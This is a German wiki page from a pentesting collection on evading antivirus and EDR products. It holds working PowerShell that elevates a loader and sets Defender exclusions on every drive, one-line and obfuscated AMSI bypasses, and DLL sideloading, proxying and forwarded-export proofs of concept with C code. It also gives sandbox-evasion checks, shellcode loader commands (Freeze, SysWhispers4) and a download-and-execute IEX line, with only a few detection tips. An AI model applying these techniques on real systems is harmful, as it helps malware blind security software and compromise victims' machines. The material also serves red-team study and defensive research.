# Antivirus (AV)-Umgehung

{{#include ../banners/hacktricks-training.md}}

**Diese Seite wurde ursprünglich von** [**@m2rc_p**](https://twitter.com/m2rc_p)** verfasst!**

## Defender stoppen

- [defendnot](https://github.com/es3n1n/defendnot): Ein Tool, das Windows Defender daran hindert, zu funktionieren.
- [no-defender](https://github.com/es3n1n/no-defender): Ein Tool, das Windows Defender durch das Vortäuschen eines anderen AV daran hindert, zu funktionieren.
- [Defender deaktivieren, wenn du Admin bist](basic-powershell-for-pentesters/README.md)

### Installer-artiger UAC-Köder vor der Manipulation von Defender

Öffentlich verfügbare Loader, die sich als Game-Cheats ausgeben, werden häufig als unsignierte Node.js-/Nexe-Installer ausgeliefert, die zunächst **den Benutzer zur Erhöhung der Berechtigungen auffordern** und erst danach Defender außer Gefecht setzen. Der Ablauf ist einfach:

1. Mit `net session` prüfen, ob administrative Rechte vorliegen. Der Befehl ist nur erfolgreich, wenn der Aufrufer Admin-Rechte hat. Ein Fehlschlag bedeutet daher, dass der Loader als Standardbenutzer ausgeführt wird.
2. Den Loader sofort mit dem Verb `RunAs` erneut starten, um die erwartete UAC-Zustimmungsaufforderung auszulösen und dabei die ursprüngliche Befehlszeile beizubehalten.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Opfer glauben bereits, dass sie „gecrackte“ Software installieren, und akzeptieren die Aufforderung daher meist. So erhält die Malware die nötigen Rechte, um die Richtlinie von Defender zu ändern.<sup>[[26]](#references)</sup>

### Pauschale `MpPreference`-Ausnahmen für jeden Laufwerksbuchstaben

Nach der Rechteausweitung maximieren GachiLoader-artige Angriffsketten die blinden Flecken von Defender, anstatt den Dienst direkt zu deaktivieren. Zuerst beendet der Loader den GUI-Watchdog (`taskkill /F /IM SecHealthUI.exe`) und richtet anschließend **extrem weitreichende Ausnahmen** ein, sodass jedes Benutzerprofil, jedes Systemverzeichnis und jedes Wechsellaufwerk nicht mehr überprüft werden kann:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Wichtige Beobachtungen:

- Die Schleife durchläuft jedes eingebundene Dateisystem (D:\, E:\, USB-Sticks usw.), sodass **jede zukünftige Payload, die irgendwo auf dem Datenträger abgelegt wird, ignoriert wird**.
- Der Ausschluss der Erweiterung `.sys` ist vorausschauend – Angreifer behalten sich so die Möglichkeit vor, später unsignierte Treiber zu laden, ohne Defender erneut anzufassen.
- Alle Änderungen landen unter `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`. So können spätere Phasen bestätigen, dass die Ausnahmen weiterhin bestehen, oder sie erweitern, ohne erneut UAC auszulösen.

Da kein Defender-Dienst beendet wird, melden einfache Integritätsprüfungen weiterhin „Antivirus aktiv“, obwohl die Echtzeitprüfung diese Pfade nie überprüft.<sup>[[26]](#references)</sup>

## **AV Evasion-Methodik**

AVs verwenden derzeit verschiedene Methoden, um zu prüfen, ob eine Datei schädlich ist: statische Erkennung, dynamische Analyse und bei den fortschrittlicheren EDRs Verhaltensanalyse.

### **Statische Erkennung**

Statische Erkennung erfolgt, indem bekannte schädliche Zeichenfolgen oder Byte-Arrays in einer Binärdatei oder einem Skript markiert und Informationen aus der Datei selbst extrahiert werden (z. B. Dateibeschreibung, Firmenname, digitale Signaturen, Symbol, Prüfsumme usw.). Das bedeutet, dass die Verwendung bekannter öffentlicher Tools dazu führen kann, dass du leichter entdeckt wirst, da sie wahrscheinlich bereits analysiert und als schädlich markiert wurden. Es gibt einige Möglichkeiten, diese Art der Erkennung zu umgehen:

- **Verschlüsselung**

Wenn du die Binärdatei verschlüsselst, kann AV dein Programm nicht erkennen. Du benötigst dann jedoch eine Art Loader, um das Programm zu entschlüsseln und im Speicher auszuführen.

- **Obfuskation**

Manchmal musst du nur einige Zeichenfolgen in deiner Binärdatei oder deinem Skript ändern, damit es AV passiert. Je nachdem, was du obfuskieren möchtest, kann das jedoch zeitaufwendig sein.

- **Benutzerdefinierte Tools**

Wenn du eigene Tools entwickelst, gibt es keine bekannten schädlichen Signaturen. Das kostet jedoch viel Zeit und Mühe.

> [!TIP]
> Eine gute Möglichkeit, die statische Erkennung durch Windows Defender zu überprüfen, ist [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Das Tool teilt die Datei im Grunde in mehrere Segmente auf und lässt Defender jedes davon einzeln scannen. So kann es dir genau mitteilen, welche Zeichenfolgen oder Bytes in deiner Binärdatei markiert werden.

Ich empfehle dir dringend, dir diese [YouTube-Playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) zu praktischer AV Evasion anzusehen.

### Offline-Tests von PE-Merkmalen für statische Klassifikatoren

Gepackte oder verschlüsselte Payload-Bytes sind nur eine von mehreren Eingaben für einen statischen Klassifikator. EMBER2024 extrahiert PE-Merkmale wie Imports, Exports, Sections, Header und Authenticode-Daten.<sup>[[48]](#references)</sup> In einem Loader-Experiment senkten 141 harmlos wirkende Imports den EMBER2024-Schadscore um 93 %, während mit Malware assoziierte Imports ihn erhöhten. Dieses Ergebnis gilt für das betreffende Modell und diese Samples und ist keine zuverlässige Umgehung eines bestimmten AV-/EDR-Produkts.<sup>[[50]](#references)</sup>

Bei einem autorisierten Loader-Test solltest du Payload und Ausführungspfad konstant halten, pro Variante jeweils nur eine beabsichtigte Build-Variable ändern und die Scores offline vergleichen. Untersuche die resultierenden PE-Merkmale, da eine Build-Änderung mehr als eine Merkmalsgruppe beeinflussen kann.<sup>[[49]](#references)[[50]](#references)</sup> Damit die vorgesehenen Imports in der IAT bleiben, rufe die ausgewählten Win32-APIs aus erreichbarem Code auf. Variiere die Auswahl und verteile die Aufrufstellen über verschiedene Builds, statt eine feste Tarnfunktion zu erstellen, die zu einer Signatur werden könnte. Das Experiment berichtete außerdem von niedrigeren Scores bei gültiger Code-Signierung, Export-Einträgen und einer größeren Anzahl von Funktionen, die `.pdata` vergrößern; ungültige Signierung hatte kaum Auswirkungen und der Effekt von `.pdata` war gering.<sup>[[50]](#references)</sup>

Das Paket `thrember` bietet Feature-Extraktion und Benchmark-Modelle. Installiere es und verwende `thrember.download_models("models")` mit einem vorhandenen `models`-Verzeichnis. Führe den Scorer anschließend aus dessen übergeordnetem Verzeichnis aus: Der Download-Helfer ändert das aktuelle Arbeitsverzeichnis. Der PE-Klassifikator kann ein Verzeichnis mit Builds bewerten, ohne sie an einen Scan-Dienst zu übermitteln:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Keep the Modell- und Feature-Extractor-Versionen während des Vergleichs unverändert. Ein niedrigerer Offline-Score zeigt nur, wie dieser Klassifikator auf die geänderte Binärdatei reagiert; er beweist nicht, dass Verhaltensanalyse, Emulation oder das abweichende Modell eines Anbieters umgangen werden.<sup>[[49]](#references)[[50]](#references)</sup> Informationen zu [Per-Build-Polymorphismus und Tarnung der äußeren Binärdatei in virtualisierten Payloads](virtualized-payload-execution.md#camouflaging-the-outer-go-executable) findest du im separaten Ausführungsmodell.

### **Dynamische Analyse**

Bei der dynamischen Analyse führt das AV deine Binärdatei in einer Sandbox aus und beobachtet sie auf bösartige Aktivitäten (z. B. den Versuch, die Passwörter deines Browsers zu entschlüsseln und auszulesen, einen Minidump von LSASS zu erstellen usw.). Dieser Teil kann etwas kniffliger sein, aber hier sind einige Dinge, die du tun kannst, um Sandboxes zu umgehen.

- **Vor der Ausführung warten** Je nachdem, wie dies implementiert ist, kann es eine gute Möglichkeit sein, die dynamische Analyse des AV zu umgehen. AVs haben nur sehr wenig Zeit, Dateien zu scannen, ohne den Arbeitsablauf des Benutzers zu unterbrechen. Lange Wartezeiten können daher die Analyse von Binärdateien stören. Das Problem ist, dass viele AV-Sandboxes die Wartezeit einfach überspringen können, je nachdem, wie sie implementiert sind.
- **Systemressourcen überprüfen** Sandboxes haben normalerweise nur sehr wenige Ressourcen zur Verfügung (z. B. < 2GB RAM), da sie sonst den Rechner des Benutzers verlangsamen könnten. Hier kannst du auch sehr kreativ werden, zum Beispiel die CPU-Temperatur oder sogar die Lüftergeschwindigkeit überprüfen. Nicht alles davon wird in der Sandbox implementiert sein.
- **Rechnerspezifische Prüfungen** Wenn du einen Benutzer angreifen möchtest, dessen Workstation Mitglied der Domäne "contoso.local" ist, kannst du die Domäne des Computers überprüfen und feststellen, ob sie mit der von dir angegebenen übereinstimmt. Wenn nicht, kannst du dein Programm beenden lassen.

Wie sich herausstellt, lautet der Computername der Microsoft Defender-Sandbox HAL9TH. Du kannst also vor der Ausführung deiner Malware den Computernamen überprüfen. Wenn er HAL9TH lautet, befindest du dich in der Defender-Sandbox und kannst dein Programm beenden lassen.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>Quelle: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Einige weitere wirklich gute Tipps von [@mgeeky](https://twitter.com/mariuszbit), um Sandboxes zu umgehen:

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev-Kanal</p></figcaption></figure>

Wie wir in diesem Beitrag bereits gesagt haben, werden **öffentliche Tools** früher oder später **erkannt**. Du solltest dir also eine Frage stellen:

Wenn du beispielsweise LSASS dumpen möchtest, **musst du wirklich mimikatz verwenden**? Oder könntest du ein anderes, weniger bekanntes Projekt verwenden, das ebenfalls LSASS dumpen kann?

Die richtige Antwort ist wahrscheinlich Letzteres. Nimmt man mimikatz als Beispiel: Es ist wahrscheinlich eines der am häufigsten von AVs und EDRs erkannten Malware-Tools, wenn nicht sogar das am häufigsten erkannte. Das Projekt selbst ist zwar supercool, aber es ist auch ein Albtraum, damit AVs zu umgehen. Suche daher einfach nach Alternativen für das, was du erreichen möchtest.

> [!TIP]
> Wenn du deine Payloads zur Umgehung modifizierst, solltest du **die automatische Übermittlung von Samples** in Defender deaktivieren. Und bitte, wirklich: **Lade sie NICHT auf VIRUSTOTAL hoch**, wenn du langfristig eine Umgehung erreichen möchtest. Wenn du überprüfen willst, ob eine bestimmte AV deine Payload erkennt, installiere das AV in einer VM, versuche die automatische Übermittlung von Samples zu deaktivieren und teste die Payload dort, bis du mit dem Ergebnis zufrieden bist.

## EXEs vs DLLs

Wenn möglich, solltest du für die Umgehung immer **DLLs bevorzugen**. Meiner Erfahrung nach werden DLL-Dateien normalerweise **deutlich seltener erkannt und analysiert**. In manchen Fällen ist das also ein sehr einfacher Trick, um einer Erkennung zu entgehen (vorausgesetzt natürlich, deine Payload kann als DLL ausgeführt werden).

Wie wir in diesem Bild sehen, hat eine DLL-Payload von Havoc auf antiscan.me eine Erkennungsrate von 4/26, während die EXE-Payload eine Erkennungsrate von 7/26 hat.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>Vergleich einer normalen Havoc-EXE-Payload mit einer normalen Havoc-DLL auf antiscan.me</p></figcaption></figure>

Nun zeigen wir einige Tricks, mit denen du DLL-Dateien deutlich unauffälliger machen kannst.

## DLL Sideloading & Proxying

**DLL Sideloading** nutzt die vom Loader verwendete DLL-Suchreihenfolge aus, indem die Opferanwendung und die bösartigen Payloads nebeneinander platziert werden.

Mit [Siofra](https://github.com/Cybereason/siofra) und dem folgenden PowerShell-Skript kannst du nach Programmen suchen, die für DLL Sideloading anfällig sind:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Dieser Befehl gibt die Liste der Programme in "C:\Program Files\\" aus, die für DLL hijacking anfällig sind, sowie die DLL-Dateien, die sie zu laden versuchen.

Ich empfehle dringend, **selbst nach DLL Hijackable/Sideloadable-Programmen zu suchen**. Bei korrekter Durchführung ist diese Technik ziemlich stealthy. Wenn du jedoch öffentlich bekannte DLL Sideloadable-Programme verwendest, wirst du möglicherweise leicht entdeckt.

Wenn du einfach eine bösartige DLL mit dem Namen platzierst, den ein Programm zu laden erwartet, wird dein Payload nicht geladen, da das Programm bestimmte Funktionen in dieser DLL erwartet. Um dieses Problem zu beheben, verwenden wir eine andere Technik namens **DLL Proxying/Forwarding**.

**DLL Proxying** leitet die Aufrufe, die ein Programm macht, von der Proxy-DLL (der bösartigen DLL) an die ursprüngliche DLL weiter. Dadurch bleibt die Funktionalität des Programms erhalten und dein Payload kann ausgeführt werden.

Ich werde das Projekt [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) von [@flangvik](https://twitter.com/Flangvik/) verwenden.

Dies sind die Schritte, die ich ausgeführt habe:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Der letzte Befehl liefert uns 2 Dateien: eine DLL-Quellcodevorlage und die ursprünglich umbenannte DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

These sind die Ergebnisse:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sowohl unser Shellcode (mit [SGN](https://github.com/EgeBalci/sgn) codiert) als auch die Proxy-DLL haben auf [antiscan.me](https://antiscan.me) eine Erkennungsrate von 0/26! Ich würde das als Erfolg bezeichnen.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ich **empfehle dringend**, dir [S3cur3Th1sSh1t's Twitch-VOD](https://www.twitch.tv/videos/1644171543) über DLL Sideloading sowie [ippsecs Video](https://www.youtube.com/watch?v=3eROsG_WNpE) anzusehen, um mehr über das, was wir besprochen haben, in größerer Tiefe zu erfahren.

### Missbrauch weitergeleiteter Exports (ForwardSideLoading)

Windows-PE-Module können Funktionen exportieren, die tatsächlich „Forwarder“ sind: Statt auf Code zu verweisen, enthält der Exporteintrag eine ASCII-Zeichenfolge im Format `TargetDll.TargetFunc`. Wenn ein Aufrufer den Export auflöst, führt der Windows-Loader Folgendes aus:

- `TargetDll` laden, falls sie noch nicht geladen ist
- `TargetFunc` daraus auflösen

Wichtige Verhaltensweisen:
- Wenn `TargetDll` eine KnownDLL ist, wird sie aus dem geschützten KnownDLLs-Namespace bereitgestellt (z. B. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Wenn `TargetDll` keine KnownDLL ist, wird die normale DLL-Suchreihenfolge verwendet, zu der auch das Verzeichnis des Moduls gehört, das die Weiterleitung auflöst.

Dadurch entsteht ein indirekter Sideloading-Primitive: Finde eine signierte DLL, die eine Funktion exportiert, die an ein Modul mit einem Namen weitergeleitet wird, der keiner KnownDLL entspricht, und lege diese signierte DLL zusammen mit einer vom Angreifer kontrollierten DLL ab, deren Name genau dem Namen des weitergeleiteten Zielmoduls entspricht. Wenn der weitergeleitete Export aufgerufen wird, löst der Loader die Weiterleitung auf und lädt deine DLL aus demselben Verzeichnis, wodurch dein DllMain ausgeführt wird.<sup>[[13]](#references)</sup>

Beispiel unter Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` ist keine KnownDLL, daher wird sie über die normale Suchreihenfolge aufgelöst.

PoC (copy-paste):
1) Kopiere die signierte System-DLL in einen beschreibbaren Ordner
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Lege eine bösartige `NCRYPTPROV.dll` im selben Ordner ab. Ein minimales `DllMain` genügt, um Codeausführung zu erreichen; du musst die weitergeleitete Funktion nicht implementieren, um `DllMain` auszulösen.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Löse die Weiterleitung mit einem signierten LOLBin aus:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Beobachtetes Verhalten:
- rundll32 (signiert) lädt die Side-by-Side-`keyiso.dll` (signiert)
- Beim Auflösen von `KeyIsoSetAuditingInterface` folgt der Loader der Weiterleitung zu `NCRYPTPROV.SetAuditingInterface`
- Der Loader lädt anschließend `NCRYPTPROV.dll` aus `C:\test` und führt dessen `DllMain` aus
- Wenn `SetAuditingInterface` nicht implementiert ist, wird der Fehler „missing API“ erst ausgegeben, nachdem `DllMain` bereits ausgeführt wurde

Hunting-Tipps:
- Konzentriere dich auf weitergeleitete Exports, bei denen das Zielmodul keine KnownDLL ist. KnownDLLs sind unter `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` aufgeführt.
- Weitergeleitete Exports kannst du mit Tools wie diesen aufzählen:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Siehe das Windows-11-Forwarder-Inventar, um nach Kandidaten zu suchen: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ideen zur Erkennung/Abwehr:
- LOLBins (z. B. rundll32.exe) überwachen, die signierte DLLs aus Nicht-Systempfaden laden und anschließend Nicht-KnownDLLs mit demselben Basisnamen aus diesem Verzeichnis laden
- Bei Prozess-/Modulketten wie `rundll32.exe` → Nicht-System-`keyiso.dll` → `NCRYPTPROV.dll` in benutzerschreibbaren Pfaden einen Alarm auslösen
- Richtlinien zur Codeintegrität (WDAC/AppLocker) durchsetzen und Schreib- und Ausführungsrechte in Anwendungsverzeichnissen verweigern

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Du kannst Freeze verwenden, um deinen shellcode unauffällig zu laden und auszuführen.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ist ein Katz-und-Maus-Spiel: Was heute funktioniert, kann morgen erkannt werden. Verlasse dich daher nie auf nur ein Tool und versuche, wenn möglich, mehrere Evasion-Techniken miteinander zu verketten.

## Direkte/indirekte Syscalls & SSN-Auflösung (SysWhispers4)

EDRs platzieren häufig **Inline-Hooks im User-Mode** auf Syscall-Stubs in `ntdll.dll`. Um diese Hooks zu umgehen, kannst du **direkte** oder **indirekte** Syscall-Stubs generieren, die die korrekte **SSN** (System Service Number) laden und in den Kernel-Modus wechseln, ohne den gehookten Export-Entry-Point auszuführen.<sup>[[32]](#references)</sup>

**Aufrufoptionen:**
- **Direct (embedded)**: Gibt eine `syscall`-/`sysenter`-/`SVC #0`-Instruktion im generierten Stub aus (kein Aufruf eines `ntdll`-Exports).
- **Indirect**: Springt zu einem vorhandenen `syscall`-Gadget in `ntdll`, sodass der Kernel-Übergang so aussieht, als käme er von `ntdll` (nützlich zur Umgehung heuristischer Erkennung); **randomized indirect** wählt für jeden Aufruf ein Gadget aus einem Pool aus.
- **Egg-hunt**: Vermeidet es, die statische Opcode-Sequenz `0F 05` auf der Festplatte einzubetten; löst eine Syscall-Sequenz zur Laufzeit auf.

**Hook-resistente Strategien zur SSN-Auflösung:**
- **FreshyCalls (VA sort)**: Leitet SSNs ab, indem Syscall-Stubs nach virtueller Adresse sortiert werden, statt Stub-Bytes auszulesen.
- **SyscallsFromDisk**: Mappt eine saubere `\KnownDlls\ntdll.dll`, liest SSNs aus deren `.text`-Abschnitt und hebt das Mapping anschließend auf (umgeht alle In-Memory-Hooks).
- **RecycledGate**: Kombiniert die Ableitung von SSNs durch Sortierung nach virtueller Adresse mit einer Opcode-Validierung, wenn ein Stub sauber ist; bei einem Hook wird auf die Ableitung nach virtueller Adresse zurückgegriffen.
- **HW Breakpoint**: Setzt DR0 auf die `syscall`-Instruktion und verwendet einen VEH, um die SSN zur Laufzeit aus `EAX` auszulesen, ohne gehookte Bytes zu analysieren.

Beispiel für die Verwendung von SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

Beim Parsen sauberer x64-`ntdll`-Syscall-Exports für eine SSN sollten sowohl `4C 8B D1 B8` (`mov r10, rcx; mov eax, imm32`) als auch dieselbe Sequenz mit vorangestelltem `F3 0F 1E FA` (`endbr64`) erkannt werden. Letzteres ist ein CET-präfixierter Stub: Ein Parser, der davon ausgeht, dass die SSN immer an einem festen Offset steht, übersieht ihn. Wenn die Initialisierung von indirect-syscall fehlschlägt und der Loader auf `GetProcAddress` zurückgreift, können Aufrufe über diese Exports erneut auf Hooks im User-Mode treffen.<sup>[[54]](#references)</sup>

### Alternative syscall-Exports in `tprtdll.dll`

Das Projekt gibt an, dass `tprtdll.dll` eine von Microsoft signierte DLL ist, die unter Windows 11 Build 26100 und höher in `C:\Windows\System32\` vorhanden ist. Sie hat separate Codeadressen von `ntdll.dll`, sodass ein Hook, der nur einen `ntdll`-Syscall-Einstiegspunkt patcht, den entsprechenden `tprtdll`-Stub nicht patcht. Anders als die oben beschriebenen SSN-Auflösungsmethoden lädt dieser Ansatz `tprtdll.dll` und ruft einen verfügbaren `Nt*`- oder `Zw*`-Export direkt über `GetProcAddress` auf. Prüfe, ob die DLL und die benötigten Exports vorhanden sind, und verwende die passenden NT-Funktionsprototypen.<sup>[[55]](#references)</sup>

Die Self-Injection-PoC verwendet `tprtdll!NtAllocateVirtualMemoryEx`, um RW-Speicher zu reservieren, kopiert Bytes mit `memcpy`, ändert den Bereich mit `tprtdll!ZwProtectVirtualMemory` auf RX und startet mit `tprtdll!RtlCreateUserThread` einen Thread.<sup>[[56]](#references)</sup> Die Cross-Process-Variante benötigt ein zugängliches Handle für den Zielprozess und verwendet `WriteProcessMemory` zum Kopieren.<sup>[[57]](#references)</sup> Im Exportverzeichnis des Projekts fehlen `NtOpenProcess`, `NtWriteVirtualMemory` und `NtCreateThreadEx`, daher können nicht alle Injection-Operationen einen alternativen Export verwenden.<sup>[[55]](#references)</sup>

Die PoC belegt nicht, dass `RtlCreateUserThread` ein direkter Syscall-Stub ist oder dass seine internen Aufrufe `ntdll`-Hooks umgehen, nur weil der Export aus `tprtdll` aufgelöst wurde.<sup>[[56]](#references)</sup> Das Cross-Process-Beispiel enthält außerdem die Adressen von `WinExec` und `ExitThread`, die im Injector aufgelöst wurden; diese Adressen müssen im Zielprozess gültig sein, damit die Payload des Beispiels funktioniert.<sup>[[57]](#references)</sup>

Damit werden nur Hooks umgangen, die auf die entsprechenden `ntdll`-Exports beschränkt sind; die Syscalls werden dadurch nicht vor der Überwachung auf Kernel-Ebene verborgen.<sup>[[55]](#references)</sup> Eine Injection-Methode, die stattdessen Remote-Writes und neue Threads vermeidet, findest du unter [Thread Name-Calling and Waiting Thread Hijacking](windows-process-injection-thread-name-calling-waiting-thread-hijacking.md).

## AMSI (Anti-Malware Scan Interface)

AMSI wurde entwickelt, um „[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)“ zu verhindern. Ursprünglich konnten AVs nur **Dateien auf dem Datenträger** scannen. Wenn man Payloads also irgendwie **direkt im Arbeitsspeicher** ausführen konnte, konnte der AV nichts dagegen tun, da ihm die nötige Sichtbarkeit fehlte.

Die AMSI-Funktion ist in diese Windows-Komponenten integriert:

- Benutzerkontensteuerung (User Account Control, UAC; Erhöhung von EXE, COM, MSI oder ActiveX-Installationen)
- PowerShell (Skripte, interaktive Verwendung und dynamische Codeauswertung)
- Windows Script Host (wscript.exe und cscript.exe)
- JavaScript und VBScript
- Office-VBA-Makros

Sie ermöglicht es Antivirenlösungen, das Verhalten von Skripten zu untersuchen, indem Skriptinhalte unverschlüsselt und unverschleiert bereitgestellt werden.

Beim Ausführen von `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` wird unter Windows Defender die folgende Warnung ausgegeben.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Beachte, dass `amsi:` vorangestellt wird, gefolgt vom Pfad zur ausführbaren Datei, über die das Skript ausgeführt wurde – in diesem Fall powershell.exe.

Wir haben keine Datei auf den Datenträger geschrieben, wurden aber trotzdem im Arbeitsspeicher durch AMSI erkannt.

Außerdem wird C#-Code seit **.NET 4.8** ebenfalls durch AMSI geleitet. Das betrifft sogar `Assembly.Load(byte[])` zum Laden von Code, der im Arbeitsspeicher ausgeführt wird. Deshalb wird für die Ausführung im Arbeitsspeicher die Verwendung niedrigerer .NET-Versionen (wie 4.7.2 oder älter) empfohlen, wenn AMSI umgangen werden soll.

Es gibt mehrere Möglichkeiten, AMSI zu umgehen:

- **Verschleierung**

Da AMSI hauptsächlich mit statischen Erkennungen arbeitet, kann das Ändern der zu ladenden Skripte eine gute Möglichkeit sein, der Erkennung zu entgehen.

AMSI kann Skripte jedoch auch dann entschleiern, wenn sie mehrere Verschleierungsebenen haben. Daher kann Verschleierung je nach Vorgehensweise eine schlechte Option sein. Dadurch ist es nicht ganz einfach, der Erkennung zu entgehen. Manchmal reicht es allerdings aus, ein paar Variablennamen zu ändern. Es hängt also davon ab, wie stark etwas markiert wurde.

- **AMSI Bypass**

Da AMSI durch das Laden einer DLL in den PowerShell-Prozess (sowie in cscript.exe, wscript.exe usw.) implementiert wird, lässt sich die DLL leicht manipulieren – sogar als unprivilegierter Benutzer. Aufgrund dieses Implementierungsfehlers in AMSI haben Forscher mehrere Möglichkeiten gefunden, das AMSI-Scanning zu umgehen.

**Einen Fehler erzwingen**

Wenn die AMSI-Initialisierung fehlschlägt (`amsiInitFailed`), wird für den aktuellen Prozess kein Scan gestartet. Ursprünglich wurde dies von [Matt Graeber](https://twitter.com/mattifestation) veröffentlicht, und Microsoft hat eine Signatur entwickelt, um eine breitere Nutzung zu verhindern.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Es war nur eine einzige Zeile PowerShell-Code nötig, um AMSI für den aktuellen PowerShell-Prozess unbrauchbar zu machen. Diese Zeile wurde natürlich von AMSI selbst erkannt, daher muss die Technik etwas angepasst werden.

Hier ist ein modifizierter AMSI-Bypass, den ich aus diesem [GitHub Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) übernommen habe.

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Beachte, dass dieser Beitrag wahrscheinlich markiert wird, sobald er veröffentlicht ist. Daher solltest du keinen Code veröffentlichen, wenn du vorhast, unerkannt zu bleiben.

**Memory Patching**

Diese Technik wurde ursprünglich von [@RastaMouse](https://twitter.com/_RastaMouse/) entdeckt. Dabei wird die Adresse der Funktion „AmsiScanBuffer“ in amsi.dll gefunden (zuständig für das Scannen der vom Benutzer bereitgestellten Eingabe) und mit Anweisungen überschrieben, die den Code für E_INVALIDARG zurückgeben. Dadurch gibt das Ergebnis des eigentlichen Scans 0 zurück, was als sauberes Ergebnis interpretiert wird.

> [!TIP]
> Lies [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) für eine ausführlichere Erklärung.

